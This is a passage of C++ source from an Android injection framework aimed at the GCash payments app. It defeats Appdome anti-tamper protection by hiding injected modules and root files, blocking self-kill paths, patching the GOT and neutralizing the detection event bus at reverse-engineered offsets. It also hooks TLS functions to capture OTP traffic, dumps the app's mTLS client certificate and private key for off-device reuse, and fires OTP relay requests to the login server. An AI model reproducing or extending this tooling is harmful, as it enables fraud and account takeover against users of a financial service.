    // brief settle so our injected .so is mapped (it is, at inject time). (Was a GCash-specific
    // 8s wait for libloader.so, which starved non-GCash targets of their hooks before they ran.)
    usleep(150 * 1000);

    // Force-enable the KPM process gate for THIS (GCash) process: proc_is_target only matches the
    // build's INJECTED_PACKAGE_NAME (com.android.shell)/UID 2000/a readable persist prop — none match
    // GCash — so without this every kpm_* bridge call below returned 0 (fshide/exittarget/maps-hide/
    // hooks all no-op'd, maps-hide "hid 0 VMAs"). Engage the KPM backend so the neutralize actually runs.
    kpm_hook_force_enable();

    // Arm shpte fshide for our own tgid EARLY (in-process, reliable timing + correct reader-gate) so
    // GCash's own /proc/self/mountinfo reads are filtered before the RASP scans mounts. Hides the
    // Zygisk module magic-mount lines (/adb/modules/zygisk_vector/.../dex2oat*, /data/adb, overlay,
    // magisk) that otherwise scream "rooted+injected" to Appdome. Gated persist.kpmhook.unpack.gcashmount.
    if (PropInt("persist.kpmhook.unpack.gcashmount", 1)) {
        int fa = kpm_fshide_arm(getpid());
        LOGI("[gcashfix] fshide arm(self tgid={}) = {} (mountinfo/statfs hide)", getpid(), fa);
    }

    // Auto-arm shpte do_exit for our tgid EARLY (in-process) so the Appdome exit_group self-kill is
    // neutralized the instant we inject -- the response fires flaky (338ms..75s) and manual adb
    // `exittarget` can't win that race. shpte do_exit(0)s only the monitor thread; process survives.
    // Gated persist.kpmhook.unpack.gcashexit (default ON).
    if (PropInt("persist.kpmhook.unpack.gcashexit", 1)) {
        int ea = kpm_exittarget_arm(getpid());
        LOGI("[gcashfix] exittarget arm(self tgid={}) = {} (exit_group self-kill neutralize)", getpid(), ea);
    }

    // [PRIMARY FIX] Intercept the Appdome qD2qU3 JNI enforcement dispatch (see GcashCSVMV). Hook the
    // shared JNIEnv CallStaticVoidMethodV/A libart functions so ANY qD2qU3 call (the bootstrap-queued
    // verdict OR the onContextSet replay at ~8s) is dropped -> no threat toast, no splash finish, no
    // kill-flag. Installed EARLY (before the Appdome Java bootstrap loads qwHjo5). Attach briefly only to
    // read the (process-wide) JNI function table, then detach (this worker thread returns after
    // RunGcashNeutralize in gcash mode, so it must not stay attached). Gated
    // persist.kpmhook.unpack.gcashenf, DEFAULT ON.
    if (PropInt("persist.kpmhook.unpack.gcashenf", 1)) {
        JNIEnv *jenv = nullptr;
        bool attached = false;
        if (vm->GetEnv(reinterpret_cast<void **>(&jenv), JNI_VERSION_1_6) != JNI_OK || !jenv) {
            if (vm->AttachCurrentThread(&jenv, nullptr) == JNI_OK) attached = true;
        }
        if (jenv) {
            const JNINativeInterface *fns = jenv->functions;
            void *csvmv = reinterpret_cast<void *>(fns->CallStaticVoidMethodV);
            void *csvma = reinterpret_cast<void *>(fns->CallStaticVoidMethodA);
            void *bkv = kpm_inline_hooker(csvmv, reinterpret_cast<void *>(&GcashCSVMV));
            if (bkv) { g_gc_orig_csvmv = reinterpret_cast<void (*)(JNIEnv *, jclass, jmethodID, va_list)>(bkv);
                       LOGI("[gcashenf] hooked CallStaticVoidMethodV @ {} (qD2qU3 drop armed)", csvmv); }
            else LOGW("[gcashenf] kpm_inline_hooker(CallStaticVoidMethodV) FAILED");
            void *bka = kpm_inline_hooker(csvma, reinterpret_cast<void *>(&GcashCSVMA));
            if (bka) { g_gc_orig_csvma = reinterpret_cast<void (*)(JNIEnv *, jclass, jmethodID, const jvalue *)>(bka);
                       LOGI("[gcashenf] hooked CallStaticVoidMethodA @ {}", csvma); }
            else LOGW("[gcashenf] kpm_inline_hooker(CallStaticVoidMethodA) FAILED");
        } else {
            LOGW("[gcashenf] no JNIEnv -- qD2qU3 enforcement intercept SKIPPED");
        }
        if (attached) vm->DetachCurrentThread();
    }

    // [OTP CAPTURE — recon] Traceless hook conscrypt libssl SSL_write/SSL_read to capture the walled
    // login.mynt.xyz OTP request/response once (see GcashSSLWriteHook). DEFAULT OFF; enable for a capture
    // run: resetprop persist.kpmhook.unpack.gcashsslcap 1. libssl loads on first TLS (early), well before
    // the OTP screen, so a detached base-wait hook is in place in time.
    if (PropInt("persist.kpmhook.unpack.gcashsslcap", 0)) {
        std::thread([] {
            uintptr_t lb = 0;
            for (int i = 0; i < 600; i++) { lb = FindLibBase("libssl.so"); if (lb) break; usleep(100 * 1000); }
            if (!lb) { LOGW("[gcashssl] libssl.so never appeared -- OTP capture SKIPPED"); return; }
            vector::native::ElfImage ssl("libssl.so");
            if (!ssl.IsValid()) { LOGW("[gcashssl] ElfImage(libssl.so) invalid"); return; }
            void *w = const_cast<void *>(ssl.getSymbAddress<const void *>("SSL_write"));
            if (w) {
                // Dobby (mprotect + inline patch), NOT kpm_inline_hooker: the KPM region-clone crashes on
                // the apex conscrypt libssl (file-backed dm-verity mapping is incompatible with the PTE-UXN
                // clone — device-confirmed SIGSEGV loop 2026-09-29). conscrypt is NOT Appdome-CRC'd (the
                // libc-CRC caveat is libc-only), so an inline patch there is safe + invisible to Appdome.
                void *bk = nullptr;
                if (DobbyHook(w, reinterpret_cast<dobby_dummy_func_t>(&GcashSSLWriteHook),
                              reinterpret_cast<dobby_dummy_func_t *>(&bk)) == 0 && bk) {
                    g_gc_orig_sslwrite = reinterpret_cast<int (*)(void *, const void *, int)>(bk);
                    LOGI("[gcashssl] Dobby-hooked SSL_write @ {} (OTP capture armed)", w);
                } else LOGW("[gcashssl] DobbyHook(SSL_write) FAILED");
            } else LOGW("[gcashssl] SSL_write symbol not found in libssl");
        }).detach();
    }

    // [MTLS CERT CAPTURE] Dobby-hook conscrypt libssl SSL_set_chain_and_key + SSL_use_certificate/PrivateKey
    // to dump the client cert+key presented to login.mynt.xyz (for off-device reuse; see hooks above).
    // Resolve i2d_* + CRYPTO_BUFFER_* from apex libcrypto. Trigger by an OTP relay handshake. DEFAULT OFF:
    // setprop persist.kpmhook.unpack.gcashcertcap 1.
    if (PropInt("persist.kpmhook.unpack.gcashcertcap", 0)) {
        std::thread([] {
            uintptr_t lb = 0;
            for (int i = 0; i < 600; i++) { lb = FindLibBase("libssl.so"); if (lb) break; usleep(100 * 1000); }
            if (!lb) { LOGW("[gcashcert] libssl never appeared"); return; }
            vector::native::ElfImage ssl("libssl.so");
            vector::native::ElfImage cry("libcrypto.so");
            if (!ssl.IsValid() || !cry.IsValid()) { LOGW("[gcashcert] ElfImage libssl/libcrypto invalid"); return; }
            g_i2d_X509 = reinterpret_cast<int (*)(void *, unsigned char **)>(const_cast<void *>(cry.getSymbAddress<const void *>("i2d_X509")));
            g_i2d_PrivateKey = reinterpret_cast<int (*)(void *, unsigned char **)>(const_cast<void *>(cry.getSymbAddress<const void *>("i2d_PrivateKey")));
            g_cbuf_data = reinterpret_cast<const unsigned char *(*)(void *)>(const_cast<void *>(cry.getSymbAddress<const void *>("CRYPTO_BUFFER_data")));
            g_cbuf_len = reinterpret_cast<size_t (*)(void *)>(const_cast<void *>(cry.getSymbAddress<const void *>("CRYPTO_BUFFER_len")));
            g_SSL_get_certificate = reinterpret_cast<void *(*)(void *)>(const_cast<void *>(ssl.getSymbAddress<const void *>("SSL_get_certificate")));
            g_SSL_get_privatekey = reinterpret_cast<void *(*)(void *)>(const_cast<void *>(ssl.getSymbAddress<const void *>("SSL_get_privatekey")));
            LOGI("[gcashcert] i2d_X509={} i2d_PrivateKey={} cbuf_data={} cbuf_len={} SSL_get_cert={} SSL_get_pkey={}", (void *) g_i2d_X509, (void *) g_i2d_PrivateKey, (void *) g_cbuf_data, (void *) g_cbuf_len, (void *) g_SSL_get_certificate, (void *) g_SSL_get_privatekey);
            struct { const char *name; void *hook; void **orig; } H[] = {
                {"SSL_set_chain_and_key", (void *) &GcSSLChainKey, (void **) &g_orig_chain_key},
                {"SSL_use_certificate", (void *) &GcSSLUseCert, (void **) &g_orig_use_cert},
                {"SSL_use_PrivateKey", (void *) &GcSSLUsePkey, (void **) &g_orig_use_pkey},
            };
            for (auto &h : H) {
                void *t = const_cast<void *>(ssl.getSymbAddress<const void *>(h.name));
                if (!t) { LOGW("[gcashcert] symbol {} not found", h.name); continue; }
                void *bk = nullptr;
                if (DobbyHook(t, reinterpret_cast<dobby_dummy_func_t>(h.hook), reinterpret_cast<dobby_dummy_func_t *>(&bk)) == 0 && bk) {
                    *h.orig = bk; LOGI("[gcashcert] Dobby-hooked {} @ {}", h.name, t);
                } else LOGW("[gcashcert] DobbyHook({}) FAILED", h.name);
            }
        }).detach();
    }

    // [OTP RELAY / P1 CHANNEL PROBE] In-process POST to login.mynt.xyz OTP via the app's own OkHttp stack
    // (see GcOtpRelayCall). DEFAULT OFF. Fire once the app is past splash/stable: setprop
    // persist.kpmhook.unpack.otpfire 1 (optionally push /data/local/tmp/otp_relay_req.json with an
    // off-device WCSign body, and set persist.kpmhook.unpack.otpep to a path e.g. c4/v2.3/otp/verify_code).
    if (PropInt("persist.kpmhook.unpack.gcashotp", 0)) {
        std::thread([] {
            JavaVM *vm = g_gc_vm;
            if (!vm) { LOGW("[gcashotp] no JavaVM"); return; }
            bool fired = false;
            for (int i = 0; i < 1200; i++) {          // wait for the fire signal (~40 min cap)
                char v[8] = {0};
                if (__system_property_get("persist.kpmhook.unpack.otpfire", v) > 0 && v[0] == '1') { fired = true; break; }
                usleep(2 * 1000 * 1000);
            }
            if (!fired) { LOGW("[gcashotp] otpfire never set -- probe SKIPPED"); return; }
            JNIEnv *env = nullptr; bool att = false;
            if (vm->GetEnv(reinterpret_cast<void **>(&env), JNI_VERSION_1_6) != JNI_OK || !env) {
                if (vm->AttachCurrentThread(&env, nullptr) == JNI_OK) att = true;
            }
            if (!env) { LOGW("[gcashotp] no JNIEnv"); return; }
            // config-decrypt mode: resolve a native BCipher host (e.g. REGISTRATION_DOMAIN), skip the POST
            char cfgkey[160] = {0};
            if (__system_property_get("persist.kpmhook.unpack.cfgkey", cfgkey) > 0 && cfgkey[0]) {
                GcConfigDecrypt(env, cfgkey);
                if (att) vm->DetachCurrentThread();
                return;
            }
            char host[192] = {0};
            if (__system_property_get("persist.kpmhook.unpack.otphost", host) <= 0 || !host[0])
                strcpy(host, "https://login.mynt.xyz");
            char ep[192] = {0};
            if (__system_property_get("persist.kpmhook.unpack.otpep", ep) <= 0 || !ep[0])
                strcpy(ep, "c4/v2.3/otp/generate_code");
            std::string url = std::string(host) + "/" + ep;
            std::string body;
            if (!gc_read_file("/data/local/tmp/otp_relay_req.json", body) || body.empty())
                body = "{\"sign\":\"probe.probe\"}";
            GcOtpRelayCall(env, url.c_str(), body);
            if (att) vm->DetachCurrentThread();
        }).detach();
    }

    // Prevent DETECTION (not block the response -- blocking exit/kill just crashes libloader, which
    // isn't built to survive its own self-kill failing). Hide the injected modules from BOTH
    // enumeration methods: /proc/self/maps (maps-hide loop below) AND dl_iterate_phdr (link_map).
    // Resolve libc symbols by ADDRESS (&fn); dlsym(RTLD_DEFAULT,...) returned NULL in the injected
    // .so's namespace. Hide the injected modules from dl_iterate_phdr (link_map enumeration).
    void *dl = reinterpret_cast<void *>(&dl_iterate_phdr);
    {
        void *bk = kpm_inline_hooker(dl, reinterpret_cast<void *>(&GcashDlIterateHook));
        if (bk) {
            g_gc_orig_dlip = reinterpret_cast<int (*)(int (*)(struct dl_phdr_info *, size_t, void *),
                                                      void *)>(bk);
            LOGI("[gcashfix] traceless-hooked dl_iterate_phdr @ {} (hide injected modules)", dl);
        } else {
            LOGW("[gcashfix] kpm_inline_hooker(dl_iterate_phdr) FAILED");
        }
    }
    // kill + tgkill BLOCK hooks: stop GCash's Java `Process.killProcess(self)` root-detection
    // response. Resolve by address (&fn); tgkill has no libc wrapper decl on bionic, resolve via
    // dlsym as a fallback.
    void *kf = reinterpret_cast<void *>(&kill);
    {
        void *bk = kpm_inline_hooker(kf, reinterpret_cast<void *>(&GcashKillHook));
        if (bk) { g_gc_orig_kill = reinterpret_cast<int (*)(pid_t, int)>(bk);
                  LOGI("[gcashfix] traceless-hooked kill @ {} (BLOCK self)", kf); }
        else LOGW("[gcashfix] kpm_inline_hooker(kill) FAILED");
    }
    void *tf = dlsym(RTLD_DEFAULT, "tgkill");
    if (!tf) {
        vector::native::ElfImage libc("libc.so");
        if (libc.IsValid()) tf = const_cast<void *>(libc.getSymbAddress<const void *>("tgkill"));
    }
    if (tf) {
        void *bk = kpm_inline_hooker(tf, reinterpret_cast<void *>(&GcashTgkillHook));
        if (bk) { g_gc_orig_tgkill = reinterpret_cast<int (*)(int, int, int)>(bk);
                  LOGI("[gcashfix] traceless-hooked tgkill @ {} (BLOCK self)", tf); }
        else LOGW("[gcashfix] kpm_inline_hooker(tgkill) FAILED");
    } else {
        LOGW("[gcashfix] tgkill symbol not found");
    }
    // Shamiko-style root-file hiding: hook faccessat + fstatat -> ENOENT for root paths, so GCash's
    // Java File.exists()/canRead() root detection sees a clean device (it can't decide to close).
    void *af = reinterpret_cast<void *>(&faccessat);
    if (af) {
        void *bk = kpm_inline_hooker(af, reinterpret_cast<void *>(&GcashFaccessatHook));
        if (bk) { g_gc_orig_faccessat = reinterpret_cast<int (*)(int, const char *, int, int)>(bk);
                  LOGI("[gcashfix] traceless-hooked faccessat @ {} (hide root paths)", af); }
        else LOGW("[gcashfix] kpm_inline_hooker(faccessat) FAILED");
    }
    void *sf = reinterpret_cast<void *>(&fstatat);
    if (sf) {
        void *bk = kpm_inline_hooker(sf, reinterpret_cast<void *>(&GcashFstatatHook));
        if (bk) { g_gc_orig_fstatat = reinterpret_cast<int (*)(int, const char *, void *, int)>(bk);
                  LOGI("[gcashfix] traceless-hooked fstatat @ {} (hide root paths)", sf); }
        else LOGW("[gcashfix] kpm_inline_hooker(fstatat) FAILED");
    } else {
        LOGW("[gcashfix] fstatat symbol not found");
    }
    // [self-destruct catch] Install the SIGILL udf#0 catcher (see GcUdfCatch above) so libloader's
    // fuse-blown UDF self-destruct no-ops instead of terminating the process. Waits for libloader's
    // exec segment, sets its range, installs the handler, then re-arms every 500ms in case Appdome
    // re-installs its own SIGILL handler (win the last-writer race). DEFAULT ON.
    if (PropInt("persist.kpmhook.unpack.gcashudfcatch", 1)) {
        std::thread([] {
            uintptr_t lo = 0, hi = 0;
            for (int i = 0; i < 300 && !lo; i++) {
                FILE *f = fopen("/proc/self/maps", "re");
                if (f) {
                    char ln[512]; unsigned long s, e; char pm[8], nm[300];
                    lo = 0; hi = 0;
                    while (fgets(ln, sizeof ln, f)) {
                        nm[0] = 0;
                        if (sscanf(ln, "%lx-%lx %7s %*s %*s %*s %299[^\n]", &s, &e, pm, nm) < 4) continue;
                        if (strstr(nm, "libloader.so") && pm[2] == 'x') { if (!lo || s < lo) lo = s; if (e > hi) hi = e; }
                    }
                    fclose(f);
                }
                if (lo) break;
                usleep(50 * 1000);
            }
            if (!lo) { LOGW("[gcashudf] libloader exec range not found -- SIGILL catch SKIPPED"); return; }
            g_gc_ll_lo.store(lo);
            g_gc_ll_hi.store(hi);
            struct sigaction sa;
            memset(&sa, 0, sizeof sa);
            sa.sa_sigaction = &GcUdfCatch;
            sa.sa_flags = SA_SIGINFO | SA_RESTART;
            sigemptyset(&sa.sa_mask);
            for (;;) {
                struct sigaction cur;
                if (sigaction(SIGILL, nullptr, &cur) == 0 && cur.sa_sigaction != &GcUdfCatch) {
                    struct sigaction prev;
                    if (sigaction(SIGILL, &sa, &prev) == 0) {
                        // capture the prior handler ONCE as the real-SIGILL chain target
                        if (!g_gc_ill_captured.exchange(true)) {
                            g_gc_old_ill = prev;
                            LOGI("[gcashudf] SIGILL udf-catch armed: libloader .text=[{:x},{:x})", lo, hi);
                        } else {
                            LOGW("[gcashudf] re-armed SIGILL (Appdome had re-installed its handler)");
                        }
                    }
                }
                usleep(30 * 1000);   // tight re-arm: shrink the window where Appdome's re-installed handler is live
            }
        }).detach();
    }
    // Neuter the "BC-SHA" periodic integrity monitor's self-kill decision chain (see GcashMonitorStub
    // above). Traceless-hook the chain-top decision (sub_44CC30 @ 0x44CC30) AND the near-exit leaf
    // (sub_44C69C @ 0x44C69C, where the ~300 monitor worker threads live) to return 0 -> clean verdict,
    // no native exit_group at ~18s. libloader is NOT mapped yet at this early worker (t+150ms; it loads
    // ~t+4-5s), so poll FindLibBase on a detached thread until it appears, then install (well before the
    // ~t+18s suicide). Gated by persist.kpmhook.unpack.gcashmon, DEFAULT OFF: RE-tested 2026-09-23,
    // BOTH neuter targets (decision fns sub_44CC30/sub_44C69C AND count getter sub_458598) make
    // libloader SIGSEGV ~t+10s (reason=2 SIGNALED status=11) -- short-circuiting ANY of libloader's
    // monitor/decision logic breaks it (it is not built to survive a neutered self-check; matches the
    // "blocking the response crashes libloader" note above). Kept opt-in for further R&D; the viable
    // path is DETECTION-PREVENTION (hide what BC-SHA's actual check sub_451324 reads), not neutering.
    if (PropInt("persist.kpmhook.unpack.gcashmon", 0)) {
        std::thread([] {
            uintptr_t lb = 0;
            for (int i = 0; i < 150; i++) {         // up to ~15s waiting for libloader.so to map
                lb = FindLibBase("libloader.so");
                if (lb) break;
                usleep(100 * 1000);
            }
            if (!lb) { LOGW("[gcashfix] libloader.so never appeared -- BC-SHA monitor hook SKIPPED"); return; }
            LOGI("[gcashfix] libloader.so @ {:x}; arming BC-SHA monitor neutralize", lb);
            // Hook the detection-COUNT GETTER sub_458598 (= { sub_4585B4(); return dword_9B7614; }) to
            // return 0, NOT the decision fns sub_44CC30/sub_44C69C: returning 0 from those decision
            // bodies skips their cleanup/unlock -> libloader SIGSEGVs (~t+10s, RE-observed). sub_458598
            // is a plain count getter, so returning 0 = "no detections" is a value libloader's callers
            // (sub_44C69C: v3<1 -> benign; sub_44CC30) already handle on a clean device -> normal benign
            // path with all cleanup intact, no crash, no exit_group.
            struct { unsigned long off; const char *name; } mons[] = {
                {0x458598, "BC-SHA detection-count getter (sub_458598)"},
            };
            for (auto &m : mons) {
                void *t = reinterpret_cast<void *>(lb + m.off);
                void *bk = kpm_inline_hooker(t, reinterpret_cast<void *>(&GcashMonitorStub));
                if (bk) LOGI("[gcashfix] traceless-hooked {} @ {} -> return 0", m.name, t);
                else LOGW("[gcashfix] kpm_inline_hooker({}) FAILED", m.name);
            }
        }).detach();
    } else {
        LOGI("[gcashfix] BC-SHA monitor hook SKIPPED (persist.kpmhook.unpack.gcashmon=0)");
    }
    // EXIT-GROUP CHOKE-POINT block: traceless-hook sub_35CC70 (libloader+0x35CC70) -> return (see
    // GcashExitStub). Blocks the ~18s Appdome monitor exit_group(0) self-kill at its single funnel.
    // Gated persist.kpmhook.unpack.gcashexitblock, DEFAULT OFF (experimental; test survival past 18s).
    if (PropInt("persist.kpmhook.unpack.gcashexitblock", 0)) {
        std::thread([] {
            uintptr_t lb = 0;
            for (int i = 0; i < 200; i++) { lb = FindLibBase("libloader.so"); if (lb) break; usleep(100 * 1000); }
            if (!lb) { LOGW("[gcashexit] libloader.so never appeared -- exit-block SKIPPED"); return; }
            void *t = reinterpret_cast<void *>(lb + 0x35CC70);
            void *bk = kpm_inline_hooker(t, reinterpret_cast<void *>(&GcashExitStub));
            if (bk) LOGI("[gcashexit] traceless-hooked sub_35CC70 @ {} -> return (block exit_group)", t);
            else LOGW("[gcashexit] kpm_inline_hooker(sub_35CC70) FAILED");
        }).detach();
    }
    // ROOT-FILE hide at libloader's static-libc stubs (see GcashLoaderStatHook). The real fix for the
    // ~15-18s root-detection self-kill: hide /system/bin/su (APatch's su, the only existing root file)
    // from libloader's raw newfstatat/openat. Gated persist.kpmhook.unpack.gcashloaderstat, DEFAULT ON
    // (this is the confirmed fix, not experimental).
    if (PropInt("persist.kpmhook.unpack.gcashloaderstat", 1)) {
        std::thread([] {
            uintptr_t lb = 0;
            for (int i = 0; i < 200; i++) { lb = FindLibBase("libloader.so"); if (lb) break; usleep(100 * 1000); }
            if (!lb) { LOGW("[gcashstat] libloader.so never appeared -- root-file hide SKIPPED"); return; }
            // newfstatat(79) is a HOT stub (called constantly) -> the DBI region-clone can fail if it is
            // executing / libloader .text not settled. Retry until it takes (well before the ~6.7s su scan
            // and its ~12s repeat). openat(56) is colder but retry it too.
            void *ts = reinterpret_cast<void *>(lb + 0x34C154);   // sub_34C154 = newfstatat(79) stub
            void *to = reinterpret_cast<void *>(lb + 0x34C084);   // sub_34C084 = openat(56) stub
            for (int i = 0; i < 60 && !g_gc_orig_ldstat; i++) {
                void *bs = kpm_inline_hooker(ts, reinterpret_cast<void *>(&GcashLoaderStatHook));
                if (bs) { g_gc_orig_ldstat = reinterpret_cast<long (*)(long, const char *, void *, long)>(bs);
                          LOGI("[gcashstat] traceless-hooked libloader newfstatat @ {} after {} tries", ts, i + 1); break; }
                usleep(200 * 1000);
            }
            if (!g_gc_orig_ldstat) LOGW("[gcashstat] kpm_inline_hooker(newfstatat) FAILED after retries");
            for (int i = 0; i < 30 && !g_gc_orig_ldopen; i++) {
                void *bo = kpm_inline_hooker(to, reinterpret_cast<void *>(&GcashLoaderOpenHook));
                if (bo) { g_gc_orig_ldopen = reinterpret_cast<long (*)(long, const char *, long, long)>(bo);
                          LOGI("[gcashstat] traceless-hooked libloader openat @ {} after {} tries", to, i + 1); break; }
                usleep(200 * 1000);
            }
            if (!g_gc_orig_ldopen) LOGW("[gcashstat] kpm_inline_hooker(openat) FAILED after retries");
        }).detach();
    }
    // GOT DE-TOX: defeat the Appdome bootstrap "withhold" (private linker poisons libloader's GOT with
    // a fake libc base on tamper -> LDR X17,[GOT]; BR X17 -> SIGILL/SIGSEGV; crashcatch-confirmed
    // x17=poisoned). CONTINUOUSLY rewrite libloader's GOT slots to the correct libc address
    // (libc_rx_start + libc_off) from a table captured on a clean run (gcash_gotdump). In-process
    // direct writes (GOT is rw); overwrites the poison before BR X17 uses it. Gated
    // persist.kpmhook.unpack.gcashgotfix, DEFAULT ON (this is the withhold fix).
    if (PropInt("persist.kpmhook.unpack.gcashgotfix", 1)) {
        std::thread([] {
            uintptr_t ll_base = 0, libc_lo = 0, libc_hi = 0;
            for (int i = 0; i < 200 && (!ll_base || !libc_lo); i++) {
                FILE *f = fopen("/proc/self/maps", "r");
                if (f) {
                    char line[512]; unsigned long s, e, off; char perms[8], nm[300];
                    ll_base = 0; libc_lo = 0; libc_hi = 0;
                    while (fgets(line, sizeof line, f)) {
                        nm[0] = 0;
                        if (sscanf(line, "%lx-%lx %7s %lx %*s %*s %299[^\n]", &s, &e, perms, &off, nm) < 4) continue;
                        if (strstr(nm, "libloader.so") && perms[2] == 'x') ll_base = (uintptr_t)(s - off);
                        if (strstr(nm, "/libc.so") && perms[2] == 'x') { if (!libc_lo) libc_lo = (uintptr_t)s; if ((uintptr_t)e > libc_hi) libc_hi = (uintptr_t)e; }
                    }
                    fclose(f);
                }
                if (ll_base && libc_lo) break;
                usleep(50 * 1000);
            }
            if (!ll_base || !libc_lo) { LOGW("[gcashgot] libloader/libc base not found -- GOT de-tox SKIPPED"); return; }
            size_t n = sizeof(g_got_detox) / sizeof(g_got_detox[0]);
            LOGI("[gcashgot] GOT de-tox armed: ll_base={:x} libc=[{:x},{:x}) slots={}", ll_base, libc_lo, libc_hi, (int)n);
            auto in_libc = [&](uint64_t v){ return v >= libc_lo && v < libc_hi; };
            // VERSION-DRIFT SAFETY: g_got_detox[] + the 0x93C000 GOT window were RE'd on libloader from GCash
            // 6.03.0-1235. On a re-obfuscated/recompiled Appdome build (e.g. 6.03.1-1236) libloader's layout
            // differs and those offsets land in the RELRO'd r-- region (crashcatch-confirmed: SEGV_ACCERR write
            // @ ll_base+0x93c090 in a `r--` libloader mapping, unpacker.cpp:874 -> self-kills GCash in a loop).
            // Snapshot OUR OWN writable ranges each pass and never write (nor read) a target that is not
            // currently writable -> the de-tox harmlessly no-ops on a build whose offsets don't match instead
            // of self-crashing; on the matching build every real GOT slot is writable so behaviour is unchanged.
            struct WRange { uint64_t lo, hi; };
            WRange wr[1024]; int wrn = 0;
            auto refresh_writable = [&]{
                wrn = 0;
                FILE *mf = fopen("/proc/self/maps", "r");
                if (!mf) return;
                char ln[512]; unsigned long s, e; char pm[8];
                while (fgets(ln, sizeof ln, mf) && wrn < 1024)
                    if (sscanf(ln, "%lx-%lx %7s", &s, &e, pm) == 3 && pm[1] == 'w') wr[wrn++] = { (uint64_t)s, (uint64_t)e };
                fclose(mf);
            };
            auto writable = [&](uint64_t a){ for (int i = 0; i < wrn; i++) if (a >= wr[i].lo && a + 8 <= wr[i].hi) return true; return false; };
            unsigned iter = 0; bool warned = false;
            for (;;) {
                if ((iter++ & 0xFF) == 0) refresh_writable();   // re-snapshot ~every 256 passes (mappings rarely change)
                // (a) delta from the withhold's single base-swap: first known slot that is currently poisoned.
                int64_t delta = 0;
                for (size_t i = 0; i < n && !delta; i++) {
                    uint64_t a = ll_base + g_got_detox[i].got_off;
                    if (!writable(a)) continue;                 // stale/RELRO slot -> skip (guards the read too)
                    uint64_t cur = *reinterpret_cast<volatile uint64_t *>(a);
                    uint64_t correct = (uint64_t)libc_lo + g_got_detox[i].libc_off;
                    if (cur != correct && !in_libc(cur)) delta = (int64_t)correct - (int64_t)cur;
                }
                // (b) restore all KNOWN libc-function slots to their exact correct address.
                int hot = 0;
                for (size_t i = 0; i < n; i++) {
                    uint64_t a = ll_base + g_got_detox[i].got_off;
                    if (!writable(a)) continue;                 // <-- guard: NEVER write a non-writable page
                    *reinterpret_cast<volatile uint64_t *>(a) = (uint64_t)libc_lo + g_got_detox[i].libc_off;
                    hot++;
                }
                // (c) delta-fix UNKNOWN base-swapped slots across the whole GOT (covers lazy/GLOB_DAT slots
                //     not in the table): any out-of-libc slot whose value+delta lands in libc is a poisoned
                //     libc pointer -> correct it. Resolver stubs / non-libc ptrs won't land in libc -> left.
                if (delta) {
                    for (uint64_t off = 0x93C000; off < 0x93D000; off += 8) {
                        uint64_t a = ll_base + off;
                        if (!writable(a)) continue;
                        volatile uint64_t *slot = reinterpret_cast<volatile uint64_t *>(a);
                        uint64_t v = *slot;
                        if (v && !in_libc(v) && in_libc((uint64_t)((int64_t)v + delta))) *slot = (uint64_t)((int64_t)v + delta);
                    }
                }
                if (!hot && !warned) { LOGW("[gcashgot] no known GOT slot writable (offsets stale for this libloader build) -- de-tox idle"); warned = true; }
                usleep(hot ? 500 : 50 * 1000);   // hot: tight loop beats the withhold poison; idle: back off, don't peg a core
            }
        }).detach();
    }
    // [PRIMARY FIX] Neutralize the Appdome detection->response event bus (sub_131FC8, event id 82).
    // See GcashEventBusHook. DEFAULT ON -- the treat-the-root enforcement kill switch. Installs in a
    // detached thread that grabs libloader base ASAP (well before the ~9s detection window) so the bus
    // is neutralized before any detection dispatches its response.
    if (PropInt("persist.kpmhook.unpack.gcasheventbus", 1)) {
        std::thread([] {
            uintptr_t lb = 0;
            for (int i = 0; i < 300; i++) { lb = FindLibBase("libloader.so"); if (lb) break; usleep(30 * 1000); }
            if (!lb) { LOGW("[gcasheb] libloader.so never appeared -- event-bus neutralize SKIPPED"); return; }
            void *t = reinterpret_cast<void *>(lb + 0x131FC8);   // sub_131FC8 = detection->response event bus
            void *bk = kpm_inline_hooker(t, reinterpret_cast<void *>(&GcashEventBusHook));
            if (bk) { g_gc_orig_eventbus = reinterpret_cast<long (*)(long, long)>(bk);
                      LOGI("[gcasheb] event-bus neutralized: sub_131FC8 @ {} (id 82 suppressed)", t); }
            else LOGW("[gcasheb] kpm_inline_hooker(sub_131FC8) FAILED");
        }).detach();
    }
    // OBSERVE (passthrough) threat registration to learn WHICH detection fires. See GcashAddThreatLog.
    if (PropInt("persist.kpmhook.unpack.gcashthreatlog", 0)) {
        std::thread([] {
            uintptr_t lb = 0;
            for (int i = 0; i < 200; i++) { lb = FindLibBase("libloader.so"); if (lb) break; usleep(100 * 1000); }
            if (!lb) { LOGW("[gcashthreat] libloader.so never appeared -- threat-log SKIPPED"); return; }
            void *t = reinterpret_cast<void *>(lb + 0x44ABD4);   // sub_44ABD4 = add-threat
            void *bk = kpm_inline_hooker(t, reinterpret_cast<void *>(&GcashAddThreatLog));
            if (bk) { g_gc_orig_addthreat = bk; LOGI("[gcashthreat] observing sub_44ABD4 @ {} (passthrough)", t); }
            else LOGW("[gcashthreat] kpm_inline_hooker(sub_44ABD4) FAILED");
        }).detach();
    }
    // config-map check observers (see GcashF4a30Log/GcashF4a04Log). Gated persist.kpmhook.unpack.gcashchk.
    if (PropInt("persist.kpmhook.unpack.gcashchk", 0)) {
        std::thread([] {
            uintptr_t lb = 0;
            for (int i = 0; i < 200; i++) { lb = FindLibBase("libloader.so"); if (lb) break; usleep(100 * 1000); }
            if (!lb) { LOGW("[gcashchk] libloader.so never appeared -- SKIPPED"); return; }
            void *b1 = kpm_inline_hooker(reinterpret_cast<void *>(lb + 0xF4A30), reinterpret_cast<void *>(&GcashF4a30Log));
            if (b1) { g_gc_orig_f4a30 = b1; LOGI("[gcashchk] observing sub_F4A30 (count) @ {:#x}", lb + 0xF4A30); }
            else LOGW("[gcashchk] hook sub_F4A30 FAILED");
            void *b2 = kpm_inline_hooker(reinterpret_cast<void *>(lb + 0xF4A04), reinterpret_cast<void *>(&GcashF4a04Log));
            if (b2) { g_gc_orig_f4a04 = b2; LOGI("[gcashchk] observing sub_F4A04 (bool) @ {:#x}", lb + 0xF4A04); }
            else LOGW("[gcashchk] hook sub_F4A04 FAILED");
        }).detach();
    }
    // Hook __openat (the internal both open()+openat() funnel through; libloader hooks the public
    // `open`, not this) to sanitize /proc/{mounts,self/mountinfo} -> hide module/overlay mounts.
    // GATED OFF by default (persist.kpmhook.unpack.gcashopenat=1 to enable): hooking __openat, a
    // very hot libc funnel, self-interferes with Vector's OWN hook-dex loading (openDexFileNative ->
    // ZipArchive::OpenFromFdInternal -> SIGSEGV in libartbase). faccessat/fstatat already hide root.
    if (PropInt("persist.kpmhook.unpack.gcashopenat", 0)) {
